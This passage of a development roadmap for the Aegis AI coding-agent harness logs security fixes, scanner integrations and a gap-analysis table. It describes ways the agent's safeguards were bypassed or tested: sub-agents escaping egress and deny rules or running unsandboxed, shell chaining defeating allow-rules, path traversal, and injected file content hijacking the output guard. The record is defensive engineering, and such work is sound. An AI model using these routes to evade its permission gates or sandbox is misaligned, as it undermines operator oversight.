13. **Tool exposure/subprocess/mailbox isolation gaps** — `tool.Registry.Clone()` + a per-session registry (`Server.sessionToolRegistry`) scope `tool_search` loads to the requesting session instead of exposing process-wide; subprocess swarm workers get a process group (`Setpgid`) plus Linux `Pdeathsig`/Windows Job Object (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) so an abnormal daemon death doesn't orphan them; `Mailbox.MarkRead` now evicts `processed/` entries older than `processedRetention` (7 days).
14. **Embedding provenance / prune-by-age / checkpoint scope** — `mem_vec`/`docs_vec` gained a `model` column (`embed.Embedder` gained `Model()`); a stored vector from a different model is excluded from cosine ranking rather than silently compared. `compaction.pruneStaleToolResults` now only prunes a `grep`/`glob`/`ls` dump once verified superseded by an identical later call (mirrors the existing `read_file` re-read check), not merely by turn age. Checkpoint capture now reaches subprocess-mode sub-agents: `SpawnConfig.CheckpointID` + `WorkerSpec.SessionDBPath` let the worker process open its own connection to the same session db and reconstruct an equivalent `Snapshotter`.
15. **Adversarial eval suite** — `internal/eval/adversarial_test.go` (new) extends the P9.1 harness (`GuardEvents`/`ExpectGuardFailureContains` added to `eval.go`) with four full-engine scenarios: a judge-adapter proving injected file content can't hijack the output guard, a permission rule proving a `./`-traversal evasion is still blocked, loop detection proving a nonce-varying tool call still trips, and the budget gate proving a stuck guard-retry loop still aborts.

Tests: every fix above shipped with its own regression test (permission/rules_test.go, engine/parallel_test.go, engine/budget_test.go, engine/loopdetect_test.go, tool/deferred_test.go, tool/builtin/{agent,toolsearch}\_test.go, mcp/mcp_test.go, provider/openai/openai_test.go, guard/guard_test.go, server/{server_guard,server_checkpoint}\_test.go, swarm/mailbox_test.go, longmem/knowledge_test.go, compaction/prune_test.go, cli/worker_test.go, eval/adversarial_test.go) plus the new adversarial eval suite exercising several fixes together end-to-end. Full `go test ./...` green (48 packages).

</details>

<details>
<summary><strong>P10 — Sub-agent Security Parity, all 5 items shipped 2026-07-04</strong></summary>

A service-interaction review traced how a top-level session's security posture propagates across the `agent` delegation seam into a spawned teammate, and found neither swarm backend inherited it: `server.newEngine` composes the real gate stack for a top-level run (`RuleGate` → `ContextualGate` → `PersonaToolGate` → mode gate), but `subAgentRunner` (in-process) and `executeWorker` (subprocess) both rebuilt only a bare mode gate from scratch. Mode clamping still held in both paths, so a sub-agent couldn't _escalate_ plan→build→auto — what leaked was everything finer-grained than mode.

- **P10.1 (in-process bypass):** `subAgentRunner` skipped the contextual-egress and text allow/deny rule wrapping entirely — a spawned teammate's `web_fetch`/`curl` calls ignored an operator's `egress_then_write`/deny rules. Fixed by factoring gate assembly out of `newEngine` into `(*Server).buildGate(mode, approver, persona)`, reused by both the top-level and sub-agent paths.
- **P10.2 (subprocess unsandboxed + same gate bypass):** `executeWorker` built its tool registry with no `Sandbox` at all (so a configured container/os sandbox was silently never honored for subprocess workers) and the identical bare-mode-gate bypass as P10.1. Fixed via newly-exported `server.SelectSandbox` plus layering the same contextual/rule gates, independently re-loaded from config since a subprocess has no access to the daemon's in-memory state.
- **P10.3 (subprocess budget multiplication):** each subprocess worker got a fresh full `BudgetUSD` instead of sharing the parent's ledger (which can't ride `ctx` across a process boundary), so N teammates enforced N× the intended ceiling. Fixed with a `RemainingBudgetUSD`/`RemainingTokens` handoff on `WorkerSpec`, sized against the shared tracker at spawn time, and `cost.Tracker.AddWorkerCost` folding each worker's self-reported spend back before the next sibling spawns.
- **P10.4 (no eval coverage for the delegation seam):** landed as a regression test alongside each P10.1–P10.3 fix rather than a new `internal/eval` scenario — that harness has no natural seam for spawning a _real_ sub-agent through either swarm backend.
- **P10.5 (dollar budget silently no-ops for local models):** prompted by a comparison to how cloud providers budget in tokens, not dollars. `internal/cost` derived USD from a pricing catalog and collapsed to `$0` for local/Ollama (estimated-usage) turns and any uncatalogued model — meaning the local-first deployment case had, in practice, no working spend guardrail. `cost.Tracker` gained `AddTokens`/`TotalTokens` (accumulate regardless of pricing/estimation); new `MaxTokensPerRun`/`session_token_cap`/`daily_token_cap` give a token-denominated primary budget that works everywhere, with the dollar caps remaining a cloud-only convenience layered on top.

Tests: `internal/server/server_subagent_test.go`, `internal/cli/worker_test.go`, `internal/swarm/subprocess_test.go`, `internal/cost/cost_test.go`, `internal/engine/budget_test.go`, `internal/session/session_test.go`, `internal/server/server_test.go`.

</details>

<details>
<summary><strong>P11 — Security Scanning Depth, all 12 items shipped 2026-07-04</strong></summary>

A user request to bring `internal/security`/`aegis scan`/`security_scan` — three host-installed binaries (semgrep `auto`, trivy `fs`, gitleaks) behind one normalized `Finding` model — up to best-in-class OSS coverage across SAST/SCA/container/IaC/DAST. Three structural gaps drove the track: shallow breadth, `Scanner.Available()` silently skipping any tool not on `PATH` (a clean machine reported a clean scan it never ran), and no dynamic (running-app) testing.

- **P11.1 (containerized scanner runtime, keystone):** `Scanner.Resolve` decides host-binary vs. pinned-container-image vs. unavailable — never a silent skip. Ships with **no built-in image pin** by deliberate choice: a scanner image is itself supply-chain surface, and this codebase has no way to verify a _current_ digest at commit time, so an operator pins one themselves (`security.tools.<name>.image`, digest required, see `docs/security.md`'s pin recipe).
- **P11.2 (SARIF-first normalization):** one shared `ParseSARIF` ingester (`internal/security/sarif.go`) replaces per-tool bespoke parsers for every SARIF-emitting scanner; only gitleaks (not SARIF-native) keeps a hand-written one.
- **P11.3 (SAST depth):** opengrep (no-login, no-telemetry community fork) is the new default SAST engine, semgrep selectable; both use pinned rule packs, never `--config auto`. Four opt-in language engines added (gosec/bandit/brakeman/njsscan), which required a real default-enablement mechanism (`ScannerDescriptor.DefaultEnabled`) so opt-in tools don't silently turn themselves on the moment they ship.
- **P11.4 (SCA depth + SBOM):** osv-scanner added as a new SARIF-native SCA scanner; grype's directory scan now prefers matching against a syft-generated CycloneDX SBOM (persisted to `.aegis/sbom.cdx.json`) over its own cataloger, falling back cleanly if syft is unavailable.
- **P11.5 (container image security, scoped):** new `ImageScanner`/`ScanImage` entry point (trivy image, grype, dockle, hadolint). Host-binary only for now — pulling a registry image needs network egress, which the shared container-fallback runner deliberately denies (`--network none`); a network-enabled container path is real, undone follow-up.
- **P11.6 (IaC scanning):** trivy's misconfig scanning made explicit (`--scanners vuln,secret,misconfig`); kubescape added for deeper K8s analysis — not checkov, whose OSS CLI emits no severity and would collapse to INFO in the severity-ranked model.
- **P11.7 (DAST via OWASP ZAP, v1 scope):** runs ZAP's Automation Framework (not the packaged baseline/full/api scripts) since only its `report` job can emit SARIF. Container-only, and target authorization is a **hard, code-enforced gate independent of permission mode**: loopback/RFC-1918 always allowed, anything else needs an explicit allowlist entry, and active/attack modes need a separate `allow_active` opt-in. v1 requires an already-running target; v2 ("build the target + scan it on one ephemeral network") not done.
- **P11.8 (dedup, ASVS mapping, suppression baseline):** `DedupFindings` collapses the same CVE/rule flagged by multiple tools into one finding (tagging every tool that also caught it via `SeenBy`); a curated CWE→OWASP-ASVS table tags a best-effort standards chapter automatically across every SARIF tool with zero per-tool work; an optional `.aegis/security-baseline.yaml` lets an operator suppress a specific accepted-risk finding with a **mandatory expiry** (expired/invalid entries are flagged, never silently honored — a broken baseline fails safe). The `security-audit` skill was extended to use these signals and, when asked to fix rather than review, re-scan after a fix to confirm it closed before claiming success (P4.8's close-the-loop posture applied to security remediation).
- **P11.9 (regression evals + provenance):** a golden-transcript test (`internal/security/regression_test.go`) drives the full pipeline over recorded fixtures with no scanner/network/container needed in CI, proving the P11.8 cross-tool dedup and all three baseline states end to end. Also closed a real gap found while implementing it: a configured scanner image was never actually validated as digest-pinned despite being documented as required — floating tags are now rejected (`digestPinReason`). A live ZAP capture against Juice Shop/WrongSecrets/VAmPI is documented follow-up in `testdata/README.md`, since no container runtime was available to run one this pass.
- **P11.10 (guided scanner install):** approval-gated per-tool install (`aegis security install <tool>`) — shows the exact command and requires confirmation before ever touching the host; supply-chain hygiene favors package managers/checksummed binaries over `curl | sh`.
- **P11.11 (security tool config + `/security-config`):** `security.tools.<name>` config (enabled/method/install/image) plus an interactive TUI form, so none of this requires hand-editing YAML.
- **P11.12 (reachability analysis):** osv-scanner's `--call-analysis` (govulncheck-backed for Go, on by default) surfaces whether a vulnerable dependency's flagged code is actually _called_, not just present in the dependency tree — never inferred for unsupported ecosystems, since a wrong "unreachable" claim would understate real risk.
- **Follow-up, 2026-07-05 — install-from-wizard + `/scan`:** `/security-config` gained an action step per tool (Edit settings / **Install now (guided)** / Back) that runs the same confirmed guided install `aegis security install` does (factored into a shared `security.RunGuidedInstall`), then re-resolves availability so the list reflects the newly-installed binary without leaving the dialog. New `/scan [path|image <ref>|sbom [path]]` TUI command runs a scan directly against the daemon's workspace (`POST /security/scan`, new endpoint) and prints the report — no model turn spent, mirroring `aegis scan`.

**Scope decisions kept deliberately narrow rather than over-built** (each a documented trade-off, not an oversight): no built-in image digest pins (P11.1); image scanning is host-binary only (P11.5); DAST v1 needs an already-running target (P11.7); the ZAP regression fixture is an explicitly labeled synthetic placeholder pending a live capture (P11.9); OWASP Dependency-Check remains opt-in-only with no built integration, no concrete demand yet (P11.4).

Tests: `internal/security/{method,sarif,scanners,sast,sbom,osv,dast,dedup,asvs,baseline,regression,security,install}_test.go`, `internal/cli/security_test.go`, `internal/config/write_security_test.go`, `internal/tui/{securityconfig,scan}_test.go`, `internal/server/scan_test.go`.

</details>

<details>
<summary><strong>Misc audit notes</strong></summary>

- **P7 audit — reviewed and found sound, no action needed:** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).
- **2026-07-03 documentation audit:** cross-checked every P7.1–P7.7 and TQ-track "shipped" claim against the actual code (all confirmed; only P8's cited line numbers had minor drift, now corrected) and re-read `docs/*.md` against current behavior. Found and fixed real staleness: `docs/tui-guide.md`/`docs/permissions.md` still described the pre-TQ6 y/n/a approval banner instead of the current option-list dialog; the keyboard shortcut table was missing `Alt+Enter`/`Shift+Enter`/`Ctrl+O`/`Ctrl+X` and a correct `Esc` row; `docs/configuration.md`'s `tui:` block was missing the `theme` key entirely; the `Ctrl+X` embedded terminal pane (pre-existing) had never been documented. All fixed in place.

</details>

---

## Appendix B — 2026-07 Landscape Review

What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.

**Claude Code** (the closest architectural relative):

- **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
- **Skills with progressive disclosure** — only skill _name + description_ load at session start; the full body loads on invocation. Addressed by P4.3.
- **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
- **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
- **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
- **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.

**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP _tool_ (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).

**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP _server_ (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.

**Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.

**Convergent themes across all four:** (1) token efficiency as a first-class metric, (2) user-configurable lifecycle hooks, (3) lazy/progressive context loading (skills, tools, docs), (4) headless/programmatic operation with structured output, (5) forge integration that completes the loop (PR out the other end), (6) sandboxing that doesn't require Docker. Aegis has now closed all six — MCP-server interop shipped 2026-07-05 (P6.3); A2A (P6.2) was evaluated and declined the same day (no consumer, extra protocol surface for no current benefit).

**Where Aegis was already at or ahead of parity** (no action needed): prompt-cache breakpoints in the Anthropic adapter; per-turn structured traces + cost budget enforcement; checkpoints/rewind + git rollback; output validation guard (LLM rubric + schema modes); cron scheduling; container sandbox matrix (Docker/Podman/WSL/Apple); ACP editor protocol; local-LLM-first provider posture; 17 security personas + contextual security policies (egress-then-write); audit trail.

---

## Appendix C — Gap Analysis

| #   | Category           | Gap                                                                                                                                                                                | Present in                                | Severity     | Status                                        |
| --- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ------------ | --------------------------------------------- |
| 1   | Context efficiency | Skills fully injected into system prompt (no progressive disclosure)                                                                                                               | Claude Code                               | High         | ✅ P4.3                                       |
| 2   | Extensibility      | No user-configurable lifecycle hooks                                                                                                                                               | Claude Code, opencode                     | High         | ✅ P4.4                                       |
| 3   | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading                                                                                                                     | Claude Code (ToolSearch)                  | High         | ✅ P4.6                                       |
| 4   | Automation         | Headless `aegis chat` emits plain text only                                                                                                                                        | Claude Code, Codex                        | High         | ✅ P4.5                                       |
| 5   | Safety             | Local sandbox backend = no isolation                                                                                                                                               | Codex CLI (default-on)                    | High         | ✅ P4.7                                       |
| 6   | Workflow           | Git tool stops at commit; no push / PR creation                                                                                                                                    | Claude Code, Codex                        | High         | ✅ P4.8                                       |
| 7   | Multi-agent        | Subagents report up only; no shared task list or peer messaging                                                                                                                    | Claude Code Agent Teams                   | Medium       | ✅ P5.1                                       |
| 8   | Tools              | LSP tools = diagnostics + references only                                                                                                                                          | opencode                                  | Medium       | ✅ P5.2                                       |
| 9   | Tools              | Web search scrapes DuckDuckGo HTML                                                                                                                                                 | Gemini, Claude Code                       | Medium       | ✅ P5.3                                       |
| 10  | Automation         | No notification channel for detached sessions                                                                                                                                      | Claude Code, Channels                     | Medium       | ✅ P5.4                                       |
| 11  | TUI                | No `@file#start-end` line-range syntax                                                                                                                                             | opencode                                  | Low          | ✅ P5.5                                       |
| 12  | TUI                | No draft stash across sessions                                                                                                                                                     | opencode                                  | Low          | ✅ P5.6                                       |
| 13  | Persistence        | No mid-turn state persistence on crash                                                                                                                                             | Crush, opencode                           | Low          | ⬜ P6.1                                       |
| 14  | Interop            | Cannot act as an MCP server (A2A protocol evaluated and declined 2026-07-05 — no consumer)                                                                                         | ADK, Codex                                | Low          | ✅ P6.3                                       |
| 15  | Extensibility      | Bundles install from local path only                                                                                                                                               | opencode plugin ecosystem                 | Low          | ✅ P5.7                                       |
| 16  | Memory             | Knowledge/longmem retrieval is BM25-only                                                                                                                                           | Cursor, Devin                             | Low          | ✅ P5.8                                       |
| 17  | Reliability        | No provider failover                                                                                                                                                               | Aider (litellm routing)                   | Low          | ✅ P5.9                                       |
| —   | Context efficiency | No deterministic tool-result pruning before LLM compaction                                                                                                                         | Codex CLI (token efficiency)              | Low          | ✅ P6.4                                       |
| 18  | Security           | MCP tools hardcode capability as `network`, bypassing permission gate in any mode                                                                                                  | — (internal audit)                        | **Critical** | ✅ P7.1                                       |
| 19  | Security           | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts                                                                                                   | — (internal audit)                        | High         | ✅ P7.2                                       |
| 20  | Security           | Permission allow-rule glob matches whole command string, bypassed by shell chaining                                                                                                | — (internal audit)                        | High         | ✅ P7.3                                       |
| 21  | Security           | Sandbox backend silently fails open to unsandboxed exec                                                                                                                            | — (internal audit)                        | Medium       | ✅ P7.4                                       |
| 22  | Security           | Bundle persona can silently escalate session to `auto` mode                                                                                                                        | — (internal audit)                        | Medium       | ✅ P7.5                                       |
| 23  | Security           | No signature/checksum verification on git-URL bundle installs                                                                                                                      | opencode plugin registry                  | Medium       | ✅ P7.6                                       |
| 24  | Security           | Deny rules silently no-op for tools with non-standard argument fields                                                                                                              | — (internal audit)                        | Low          | ✅ P7.7                                       |
| 25  | Performance        | Session store rewrites entire message/trace blob every turn — O(N²) over session life                                                                                              | — (internal audit)                        | High         | ✅ P8.1                                       |
| 26  | Performance        | Knowledge semantic search loads full corpus (vectors + bodies) per query                                                                                                           | — (internal audit)                        | Medium       | ✅ P8.2                                       |
| 27  | Performance        | Swarm mailbox has no eviction, grows unbounded                                                                                                                                     | — (internal audit)                        | Medium       | ✅ P8.3                                       |
| 28  | Performance        | Token estimation double-scans full conversation per turn (local models)                                                                                                            | — (internal audit)                        | Medium       | ✅ P8.4                                       |
| 29  | Performance        | Memory relevance TF-IDF recomputed from scratch every call                                                                                                                         | — (internal audit)                        | Low-Med      | ✅ P8.5                                       |
| 30  | Performance        | Write/execute tool calls unnecessarily serialize concurrent reads                                                                                                                  | — (internal audit)                        | Low          | ✅ P8.6                                       |
| 31  | Quality            | No agent-behavior eval/regression harness                                                                                                                                          | Codex, Claude Code (internal eval suites) | Medium       | ✅ P9.1                                       |
| 32  | Quality            | Zero test coverage in trace/logging/api/client packages                                                                                                                            | — (internal audit)                        | Medium       | ✅ P9.2                                       |
| 33  | Security           | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited)                                                                    | — (service-interaction review)            | **High**     | ✅ P10.1                                      |
| 34  | Security           | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env                                                                                                | — (service-interaction review)            | **High**     | ✅ P10.2                                      |
| 35  | Security           | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary)                                                                             | — (service-interaction review)            | Medium       | ✅ P10.3                                      |
| 36  | Quality            | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent                                                                                             | — (service-interaction review)            | Medium       | ✅ P10.4                                      |
| 37  | Safety             | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture                      | — (provider-budgeting comparison)         | **High**     | ✅ P10.5                                      |
| 38  | Security scanning  | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran                                                         | — (scan review)                           | High         | ✅ P11.1                                      |
| 39  | Security scanning  | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle)                                                                             | — (scan review)                           | Medium       | ✅ P11.5 (scoped: host-binary only)           |
| 40  | Security scanning  | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity)                                           | — (scan review)                           | Medium       | ✅ P11.6                                      |
| 41  | Security scanning  | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated)                                                                                            | user request                              | High         | ✅ P11.7 (v1 scope)                           |
| 42  | Security scanning  | Single SAST engine (semgrep `auto`, unpinned)                                                                                                                                      | — (scan review)                           | Medium       | ✅ P11.3                                      |
| 43  | Security scanning  | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped                                                                        | user request                              | High         | ✅ P11.10                                     |
| 44  | Security scanning  | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy                                                                 | user request                              | High         | ✅ P11.11 (CLI + `/security-config` TUI form) |
| 45  | Security scanning  | No SCA breadth beyond trivy (osv-scanner/grype) or SBOM generation                                                                                                                 | — (scan review)                           | Medium       | ✅ P11.4                                      |
| 46  | Security scanning  | SCA findings carry no reachability signal — a vulnerable _package_ present reads the same as a vulnerable _function_ actually called                                               | user request                              | Medium       | ✅ P11.12                                     |
| 47  | Security scanning  | Overlapping tools re-report the same finding; no accepted-risk allowlist; findings read as raw tool IDs with no recognized-standard mapping                                        | — (scan review)                           | Medium       | ✅ P11.8                                      |
| 48  | Security scanning  | No regression coverage over recorded scanner output; a configured `security.tools.<name>.image` was never actually validated as digest-pinned despite being documented as required | — (scan review)                           | Medium       | ✅ P11.9                                      |

---

## Appendix D — Sources (2026-07-02 review)

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) · [Steering Claude Code: skills, hooks, subagents](https://claude.com/blog/steering-claude-code-skills-hooks-rules-subagents-and-more) · [Agent Teams / subagents guide](https://saascity.io/blog/claude-code-subagents-agent-teams-2026) · [Q1 2026 update roundup](https://www.mindstudio.ai/blog/claude-code-q1-2026-update-roundup)
- [opencode docs](https://opencode.ai/docs/) · [opencode LSP servers](https://opencode.ai/docs/lsp/) · [opencode internals deep-dive](https://cefboud.com/posts/coding-agents-internals-opencode-deepdive/)
- [Claude Code vs Codex vs Gemini CLI (2026)](https://www.deployhq.com/blog/comparing-claude-code-openai-codex-and-google-gemini-cli-which-ai-coding-assistant-is-right-for-your-deployment-workflow) · [System prompts compared](https://codex.danielvaughan.com/2026/04/19/system-prompts-compared-codex-gemini-claude-code/) · [Agent capabilities compared](https://www.aimadetools.com/blog/claude-code-vs-codex-vs-gemini-agents-2026/)
